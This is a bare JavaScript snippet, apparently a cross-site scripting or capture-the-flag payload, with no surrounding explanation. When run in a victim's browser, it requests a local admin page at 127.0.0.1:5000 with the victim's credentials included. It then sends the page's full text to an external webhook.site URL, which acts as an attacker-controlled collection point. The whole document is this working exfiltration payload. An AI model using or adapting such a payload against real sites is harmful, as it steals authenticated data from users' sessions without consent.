(async () => {
  let cookies = await fetch("http://127.0.0.1:5000/admin", {
    credentials: "include",
  })
    .then((r) => r.text())
    .then((text) => {
      fetch(
        "https://webhook.site/4154552b-c675-427c-9072-5aeb3ef47f71?data=" +
          encodeURIComponent(text)
      );
    });
})();
